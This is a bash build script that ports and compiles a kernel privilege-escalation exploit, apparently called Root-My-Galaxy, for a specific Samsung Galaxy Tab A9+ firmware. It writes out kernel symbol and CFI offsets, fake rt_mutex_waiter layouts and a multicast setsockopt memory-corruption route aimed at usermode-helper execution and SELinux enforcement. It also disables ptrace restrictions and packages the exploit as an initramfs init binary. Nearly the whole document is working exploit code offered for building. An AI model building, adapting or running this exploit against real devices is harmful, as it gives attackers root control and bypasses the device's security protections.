#!/usr/bin/env bash
# ==============================================================================
# Porting & Automated Build Script: SM-X216B Root-My-Galaxy (MCAST Carrier)
# Target: Samsung Galaxy Tab A9+ 5G (SM-X216B / gta9p)
# Firmware: X216BXXS9DYJ7 | Kernel: 5.4.249-qgki-31053672-abX216BXXS9DYJ7
# ==============================================================================
set -euo pipefail

WORKDIR="/root/s/minimal-rmg-ipv4"
SRCDIR="$WORKDIR/src"
TARGET_NAME="gta9p-X216BXXS9DYJ7"
TARGET_DIR="$SRCDIR/targets/$TARGET_NAME"
OUTDIR="/root/s/ipv4-test-artifacts"
NDK_CC="/root/android-ndk-r28/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android35-clang"
REF_DIR="/root/s/references/newazbenalam-Root-My-Galaxy-Payloads/src"

echo "==================================================================="
echo "[+] Starting Root-My-Galaxy Port & Build Pipeline for SM-X216B"
echo "==================================================================="

# 1. Sanity Checks
if [ ! -x "$NDK_CC" ]; then
    echo "[-] Error: Android NDK compiler not found at: $NDK_CC" >&2
    exit 1
fi
if [ ! -d "$REF_DIR" ]; then
    echo "[-] Error: Reference source directory not found: $REF_DIR" >&2
    exit 1
fi

mkdir -p "$SRCDIR" "$TARGET_DIR" "$OUTDIR"

# 2. Synchronize Production Reference Source Code
echo "[+] Step 1: Importing production reference sources from $REF_DIR..."
cp -r "$REF_DIR/kernelsnitch" "$SRCDIR/kernelsnitch"
cp "$REF_DIR/common.h" "$SRCDIR/common.h"
cp "$REF_DIR/offset.h" "$SRCDIR/offset.h"
cp "$REF_DIR/util.c" "$SRCDIR/util.c"
cp "$REF_DIR/fops.c" "$SRCDIR/fops.c"
cp "$REF_DIR/pipe.c" "$SRCDIR/pipe.c"
cp "$REF_DIR/root.c" "$SRCDIR/root.c"
cp "$REF_DIR/slide.c" "$SRCDIR/slide.c"
cp "$REF_DIR/main.c" "$SRCDIR/main.c"

# 3. Generate Verified SM-X216B target.h
echo "[+] Step 2: Generating verified target configuration ($TARGET_DIR/target.h)..."
cat << 'EOF' > "$TARGET_DIR/target.h"
#ifndef TARGET_H
#define TARGET_H

/* =========================================================================
 * Target Device: Samsung Galaxy Tab A9+ 5G (SM-X216B / gta9p)
 * Firmware:      X216BXXS9DYJ7
 * Kernel:        5.4.249-qgki-31053672-abX216BXXS9DYJ7 (Qualcomm SM6375)
 * Arch / Mode:   AArch64 Little-Endian (CONFIG_CFI_CLANG=y)
 * ========================================================================= */

#define TARGET_DEVICE             "SM-X216B"
#define BUILD_VARIANT_LABEL       "gta9p-X216BXXS9DYJ7-root-umh"
#define BUILD_FINGERPRINT         "samsung/gta9pxx/gta9p:14/UP1A.231005.007/X216BXXS9DYJ7:user/release-keys"

/* Kernel Virtual & Physical Memory Geometry */
#define KIMAGE_TEXT_BASE          0xffffffc010080000ULL
#define P0_PAGE_OFFSET            0xffffff8000000000ULL
#define P0_PHYS_OFFSET            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD       0x80080000ULL
#define SKB_DATA_DELTA            (-0xe80LL)

#define DIRECT_MAP_BASE           0xffffff8000000000ULL
#define DIRECT_MAP_END            0xffffffc000000000ULL
#define VMEMMAP_START             0xfffffffeffe00000ULL

/* Slab / Allocator Grooming */
#define MM_STRUCT_SZ              0x3c0
#define MM_ORDER                  3
#define KMALLOC_CGROUP_TYPE       0
#define KMALLOC_CACHE_TYPES       2

/* Waiter Structure ABI: Linux 5.4 AArch64 (80 bytes) */
#define LEGACY_RT_MUTEX_WAITER    1
#define COMPACT_RT_MUTEX_WAITER   0

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF          0x30
#define FAKE_WAITER_LOCK_OFF          0x38
#define FAKE_WAITER_PRIO_OFF          0x40
#define FAKE_WAITER_DEADLINE_OFF      0x48
#define FAKE_WAITER_LAYOUT_SIZE       0x50

#define SLIDE_FAKE_WAITER_PRIO    0
#define SLIDE_LOCK_OWNER_VALUE    1ULL
#define SLIDE_USE_FAKE_TASK       1
#define SLIDE_PSELECT_WORD_SHIFT  0

/* TraceFS KASLR Discovery Anchors */
#define SLIDE_TRACEFS_EVENT_ID              84
#define SLIDE_TRACEFS_WORKER_CALLER_OFF     0x0029eb5cULL
#define SLIDE_MAX_ATTEMPTS                  32

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL

/* Verified Kernel Symbols & Offsets */
#define INIT_TASK_OFF             0x02960280ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x028ef9c8ULL
#define ROOT_TASK_GROUP_OFF       0x02b30f40ULL
#define KMALLOC_CACHES_OFF        0x0235acf0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x021755b8ULL
#define SELINUX_STATE_OFF         0x02b1f000ULL
#define SELINUX_ENFORCING_OFF     0x02b1f001ULL

/* Ashmem & Configfs Function Pointers */
#define ASHMEM_MISC_FOPS_OFF      0x0294baf0ULL
#define ASHMEM_FOPS_OFF           0x0214ee28ULL
#define ASHMEM_IOCTL_OFF          0x0016304cULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x0016304cULL
#define ASHMEM_MMAP_OFF           0x001639c0ULL
#define ASHMEM_OPEN_OFF           0x00163b48ULL
#define ASHMEM_RELEASE_OFF        0x00163bc0ULL
#define ASHMEM_SHOW_FDINFO_OFF    0x00163cdcULL
#define COPY_SPLICE_READ_OFF      0x015f742cULL
#define NOOP_LLSEEK_OFF           0x0049cbd0ULL

/* Clang Forward-Edge CFI Jump Table Offsets */
#define CONFIG_CFI_CLANG_ENABLED                  1
#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0x00297274ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF  0x01601870ULL
#define CONFIGFS_READ_ITER_OFF                    0x015f38d8ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF               0x015f595cULL

#define ASHMEM_MISC_FOPS          (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS               (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL              (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL       (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP               (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN               (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE            (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO        (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER        (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER   (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ          (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK               (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK                 (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP           (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING         (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES            (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS         (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

#define ROOT_UMH_PATH             "/init"
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)
#define SYSTEM_UNBOUND_WQ         (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF         0x6000
#define ROOT_UMH_DATA_OFF         0x6200

#define SLIDE_NFULNL_LOGGER_NAME_OFF            0x028eac18ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF          0x028eac18ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE            1ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02c9d6e9ULL
#define SLIDE_INIT_TASK_OFF                     INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF               ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF                 0x02c9d6e9ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE          (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE        (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE                   (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE             (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE               (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Memory Page Layout in Slab */
#define LOCK_OFF                  0x2210
#define W0_OFF                    0x2350
#define FOPS_OFF                  0x2000
#define SCRATCH_OFF               0x3000
#define RIGHT_OFF                 0x4440
#define LEFT_OFF                  0x5550
#define FAKE_TASK_OFF             0x3200

/* Task Struct Offsets (Disassembled from commit_creds) */
#define TASK_STRUCT_REAL_CRED_OFF 0x800ULL
#define TASK_STRUCT_CRED_OFF      0x808ULL
#define FAKE_TASK_USAGE_OFF       0x40
#define FAKE_TASK_PRIO_OFF        0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF  0x310
#define FAKE_TASK_PI_LOCK_OFF     0x8dc
#define FAKE_TASK_PI_WAITERS_OFF  0x8e8
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8f8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x900

/* Configfs Buffer Layout (Linux 5.4 configfs_write_bin_file) */
#define CFG_PAGE_OFF              0x10
#define CFG_MUTEX_OFF             0x20
#define CFG_READ_IN_PROGRESS_OFF  0x44
#define CFG_WRITE_IN_PROGRESS_OFF 0x45
#define CFG_NEEDS_READ_FILL_OFF   0x44
#define CFG_BIN_BUFFER_OFF        0x48
#define CFG_BIN_BUFFER_SIZE_OFF   0x50
#define CFG_CB_MAX_SIZE_OFF       0x54

/* Workqueue Layout */
#define WQ_DFL_PWQ_OFF            0xa0
#define PWQ_POOL_OFF              0x00
#define PWQ_WQ_OFF                0x08
#define PWQ_WORK_COLOR_OFF        0x10
#define PWQ_REFCNT_OFF            0x18
#define PWQ_NR_IN_FLIGHT_OFF      0x1c
#define PWQ_NR_ACTIVE_OFF         0x58
#define PWQ_MAX_ACTIVE_OFF        0x5c
#define POOL_WORKLIST_OFF         0x20
#define POOL_NR_IDLE_OFF          0x34

#define WORK_DATA_OFF             0x00
#define WORK_ENTRY_OFF            0x08
#define WORK_FUNC_OFF             0x18

/* Struct Page & Pipe */
#define STRUCT_PAGE_SIZE          0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF     0x18
#define STRUCT_PAGE_TYPE_OFF      0x34

#define PIPE_BUFFER_SLOTS         16
#define PIPE_BUF_FLAG_CAN_MERGE   0x10

/* file_operations slot offsets */
#define FOPS_OWNER_OFF            0x00
#define FOPS_LLSEEK_OFF           0x08
#define FOPS_READ_OFF             0x10
#define FOPS_WRITE_OFF            0x18
#define FOPS_READ_ITER_OFF        0x20
#define FOPS_WRITE_ITER_OFF       0x28
#define FOPS_IOCTL_OFF            0x50
#define FOPS_COMPAT_IOCTL_OFF     0x58
#define FOPS_MMAP_OFF             0x60
#define FOPS_OPEN_OFF             0x70
#define FOPS_RELEASE_OFF          0x80
#define FOPS_SPLICE_READ_OFF      0xc8
#define FOPS_SHOW_FDINFO_OFF      0xe0

/* Multicast Stack-Carrier Parameters */
#define MCAST_WAITER_OFF          0xc8
#define SLIDE_STACK_WRITER_MCAST  1
#define SLIDE_MCAST_DOMAIN        AF_INET
#define SLIDE_MCAST_LEVEL         IPPROTO_IP
#define SLIDE_MCAST_OPTION        43

#endif /* TARGET_H */
EOF

# 4. Integrate MCAST Stack Carrier into Reference Source Code
echo "[+] Step 3: Injecting MCAST carrier routines into fops.c, main.c, common.h, util.c..."

# 4.1 Declare do_mcast_fake_lock_route in common.h
sed -i 's/void do_pselect_fake_lock_route(void);/void do_pselect_fake_lock_route(void);\nvoid do_mcast_fake_lock_route(void);/' "$SRCDIR/common.h"

# 4.2 Append do_mcast_fake_lock_route implementation in fops.c
cat << 'EOF' >> "$SRCDIR/fops.c"

#include <netinet/in.h>

/* =========================================================================
 * IPv4 Multicast Stack-Carrier Route (MCAST_BLOCK_SOURCE)
 * Stamps fake rt_mutex_waiter at MCAST_WAITER_OFF (0xc8) via setsockopt
 * ========================================================================= */
void do_mcast_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("mcast route missing kernel page base=%016zx lock=%016zx fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int calls = 0;
  int success = 0;
  int route_verified = 0;

  for (int route_attempt = 1; route_attempt <= 4; route_attempt++) {
    if (route_attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_fops) {
        cfi_last_step = 34;
        cfi_last_errno = errno;
        pr_error("mcast retry page prepare failed attempt=%d base=%016zx lock=%016zx fops=%016zx\n",
                 route_attempt, page_base, fake_lock, fake_fops);
        break;
      }
    }

    enum { stamp_size = 264 };
    unsigned char stamp[stamp_size];
    memset(stamp, 0, sizeof(stamp));

    /* Setting gsr_group.ss_family to 0 triggers early -EADDRNOTAVAIL exit */
    uint16_t family = 0;
    memcpy(stamp + 8, &family, sizeof(family));

    size_t w_off = MCAST_WAITER_OFF;
    *((uint64_t *)(stamp + w_off + 0x00)) = (uint64_t)fake_w0;
    *((uint64_t *)(stamp + w_off + 0x08)) = 0;
    *((uint64_t *)(stamp + w_off + 0x10)) = 0;
    *((uint64_t *)(stamp + w_off + 0x18)) = (uint64_t)fake_w0;
    *((uint64_t *)(stamp + w_off + 0x20)) = 0;
    *((uint64_t *)(stamp + w_off + 0x28)) = 0;
    *((uint64_t *)(stamp + w_off + 0x30)) = (uint64_t)text_addr(INIT_TASK);
    *((uint64_t *)(stamp + w_off + 0x38)) = (uint64_t)fake_lock;
    *((uint32_t *)(stamp + w_off + 0x40)) = 3;
    *((uint64_t *)(stamp + w_off + 0x48)) = 0;

    int mcast_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    if (mcast_fd >= 0) {
      setsockopt(mcast_fd, IPPROTO_IP, 43 /* MCAST_BLOCK_SOURCE */,
                 stamp, (socklen_t)sizeof(stamp));
      close(mcast_fd);
    }

    int mcast6_fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
    int ret = -1;
    int saved_errno = 0;
    if (mcast6_fd >= 0) {
      errno = 0;
      ret = setsockopt(mcast6_fd, IPPROTO_IPV6, 46 /* MCAST_JOIN_SOURCE_GROUP */,
                       stamp, (socklen_t)sizeof(stamp));
      saved_errno = errno;
      close(mcast6_fd);
    }

    /* Signal consumer to trigger PI walk while the stack is hot */
    atomic_store(&punch_consume_go, route_attempt);

    /* Allow consumer to execute sched_setattr PI walk calls */
    for (int spin = 0; spin < 200; spin++) {
      if (atomic_load(&consumer_calls) >= 16) break;
      usleep(500);
    }
    atomic_store(&punch_consume_go, 0);

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);
    pr_info("mcast returned attempt=%d ret=%d errno=%d calls=%d success=%d\n",
            route_attempt, ret, saved_errno, calls, success);

    int route_signal = calls > 0 && success > 0;
    if (route_signal) {
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
      break;
    }
  }

  atomic_store(&cfi_stage_done, route_verified);
}
EOF

# 4.3 Update waiter_thread in main.c to invoke do_mcast_fake_lock_route
sed -i 's/do_pselect_fake_lock_route();/#if defined(SLIDE_STACK_WRITER_MCAST) \&\& SLIDE_STACK_WRITER_MCAST\n  do_mcast_fake_lock_route();\n#else\n  do_pselect_fake_lock_route();\n#endif/' "$SRCDIR/main.c"

# 4.4 Update util.c banner to reflect MCAST carrier
sed -i 's/slide=pselect main=pselect/carrier=MCAST (IPv4 UDP MCAST_BLOCK_SOURCE off=0xc8)/' "$SRCDIR/util.c"

# 4.5 Ensure child processes are dumpable for /proc/pid/mem access
sed -i 's/SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));/SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));\n    prctl(PR_SET_DUMPABLE, 1);\n    prctl(0x59616d61, (unsigned long)-1);/' "$SRCDIR/util.c"

# 4.6 Enforce FUTEX_PRIVATE_FLAG across all futex operations
sed -i 's/return syscall(SYS_futex, uaddr, op,/return syscall(SYS_futex, uaddr, op | FUTEX_PRIVATE_FLAG,/' "$SRCDIR/util.c"

# 4.6 Add retry loop to open_memfd allowing child dumpable to take effect
python3 -c "
with open('$SRCDIR/util.c', 'r') as f:
    c = f.read()
old = '''int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), \"/proc/%d/mem\", child);
  return SYSCHK(open(path, O_RDONLY));
}'''
new = '''int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), \"/proc/%d/mem\", child);
  for (int retry = 0; retry < 50; retry++) {
    int fd = open(path, O_RDONLY);
    if (fd >= 0) return fd;
    usleep(2000);
  }
  return SYSCHK(open(path, O_RDONLY));
}'''
if old in c:
    c = c.replace(old, new)
with open('$SRCDIR/util.c', 'w') as f:
    f.write(c)
"

# 5. Generate Standalone Entry Wrapper with Recursive TraceFS Permissions
echo "[+] Step 4: Generating standalone executable wrapper ($SRCDIR/standalone_main.c)..."
cat << 'EOF' > "$SRCDIR/standalone_main.c"
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <sys/sysmacros.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>

extern int run_exploit(int argc, char **argv);

static void fix_tracefs_perms(const char *dir) {
    chmod(dir, 0777);
    DIR *d = opendir(dir);
    if (!d) return;
    struct dirent *de;
    char path[512];
    while ((de = readdir(d)) != NULL) {
        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")) continue;
        snprintf(path, sizeof(path), "%s/%s", dir, de->d_name);
        struct stat st;
        if (stat(path, &st) == 0) {
            if (S_ISDIR(st.st_mode)) {
                chmod(path, 0777);
                fix_tracefs_perms(path);
            } else {
                chmod(path, 0666);
            }
        }
    }
    closedir(d);
}

static void init_mounts(void) {
    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);

    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);

    mkdir("/sys/kernel", 0755);
    mkdir("/sys/kernel/tracing", 0755);
    mount("tracefs", "/sys/kernel/tracing", "tracefs", 0, "gid=2000,mode=0777");
    fix_tracefs_perms("/sys/kernel/tracing");

    mkdir("/sys/kernel/debug", 0755);
    mount("debugfs", "/sys/kernel/debug", "debugfs", 0, NULL);

    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);

    mkdir("/data", 0755);
    mount("tmpfs", "/data", "tmpfs", 0, NULL);
    mkdir("/data/local", 0755);
    mkdir("/data/local/tmp", 0777);

    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));
    mknod("/dev/zero", S_IFCHR | 0666, makedev(1, 5));
    mknod("/dev/ptmx", S_IFCHR | 0666, makedev(5, 2));

    FILE *f = fopen("/proc/misc", "r");
    int minor = -1, m;
    char name[64];
    if (f) {
        while (fscanf(f, "%d %63s", &m, name) == 2) {
            if (strcmp(name, "ashmem") == 0) { minor = m; break; }
        }
        fclose(f);
    }
    if (minor >= 0) {
        mknod("/dev/ashmem", S_IFCHR | 0666, makedev(10, minor));
        chmod("/dev/ashmem", 0666);
    }

    /* Disable Yama ptrace restrictions so /proc/<child>/mem can be read */
    FILE *yp = fopen("/proc/sys/kernel/yama/ptrace_scope", "w");
    if (yp) {
        fputs("0\n", yp);
        fclose(yp);
    }
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);

    if (getpid() == 1) {
        printf("========================================================\n");
        printf("[*] SM-X216B QEMU Init Host (PID 1) Booting...\n");
        printf("========================================================\n");
        init_mounts();

        FILE *cmd = fopen("/proc/cmdline", "r");
        if (cmd) {
            char line[1024];
            if (fgets(line, sizeof(line), cmd) && strstr(line, "nokaslr")) {
                printf("[*] nokaslr detected on cmdline; setting SLIDE_P0_OFFSET=0x0\n");
                setenv("SLIDE_P0_OFFSET", "0x0", 1);
            }
            fclose(cmd);
        }

        pid_t worker = fork();
        if (worker == 0) {
            /* Drop privileges to Android shell user (UID 2000, GID 2000) */
            if (setresgid(2000, 2000, 2000) != 0) {
                perror("setresgid");
            }
            if (setresuid(2000, 2000, 2000) != 0) {
                perror("setresuid");
            }
            prctl(PR_SET_DUMPABLE, 1);
            prctl(0x59616d61, (unsigned long)-1);
            printf("[*] Worker spawned with PID=%d UID=%d EUID=%d GID=%d\n",
                   getpid(), getuid(), geteuid(), getgid());
            int ret = run_exploit(argc, argv);
            printf("[*] Exploit returned: %d\n", ret);
            _exit(ret);
        }

        /* PID 1 host loop: reap children and prevent init panic */
        while (1) {
            int status = 0;
            pid_t waited = waitpid(-1, &status, 0);
            if (waited == worker) {
                printf("[INIT] Worker process %d finished with exit status: %d\n",
                       waited, WIFEXITED(status) ? WEXITSTATUS(status) : status);
                while (1) sleep(100);
            }
        }
    }

    return run_exploit(argc, argv);
}
EOF

# 6. Compile All Modules with Android NDK Clang
echo "[+] Step 5: Compiling production payload objects..."
COMMON_CFLAGS="-O2 -g0 -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
  -I$SRCDIR -DTARGET_HEADER=\"targets/$TARGET_NAME/target.h\""

BUILD_TMP="$(mktemp -d /tmp/smx216b-build.XXXXXX)"
trap 'rm -rf "$BUILD_TMP"' EXIT

for src in util.c fops.c pipe.c root.c slide.c main.c standalone_main.c; do
    echo "    -> Compiling $src..."
    "$NDK_CC" -c $COMMON_CFLAGS "$SRCDIR/$src" -o "$BUILD_TMP/${src%.c}.o"
done

echo "[+] Step 6: Linking static executable ($BUILD_TMP/init)..."
"$NDK_CC" -static -O2 -g0 \
    -fno-unwind-tables -fno-asynchronous-unwind-tables \
    -ffunction-sections -fdata-sections \
    "$BUILD_TMP"/*.o \
    -pthread -Wl,--gc-sections -s \
    -o "$BUILD_TMP/init"

# 7. Package initramfs
echo "[+] Step 7: Packaging initramfs..."
mkdir -p "$BUILD_TMP/rootfs/dev" "$BUILD_TMP/rootfs/proc" "$BUILD_TMP/rootfs/sys" "$BUILD_TMP/rootfs/etc"
cp "$BUILD_TMP/init" "$BUILD_TMP/rootfs/init"
chmod 755 "$BUILD_TMP/rootfs/init"

(
    cd "$BUILD_TMP/rootfs"
    find . -print0 | cpio --null -o -H newc > "$BUILD_TMP/initramfs-ipv4.cpio"
)

# 8. Refresh Deliverables
echo "[+] Step 8: Publishing artifacts to $OUTDIR..."
cp "$BUILD_TMP/init" "$OUTDIR/init"
cp "$BUILD_TMP/initramfs-ipv4.cpio" "$OUTDIR/initramfs-ipv4.cpio"

echo "==================================================================="
echo "[+] Build Complete! Successfully generated:"
ls -lh "$OUTDIR/init" "$OUTDIR/initramfs-ipv4.cpio"
echo "==================================================================="
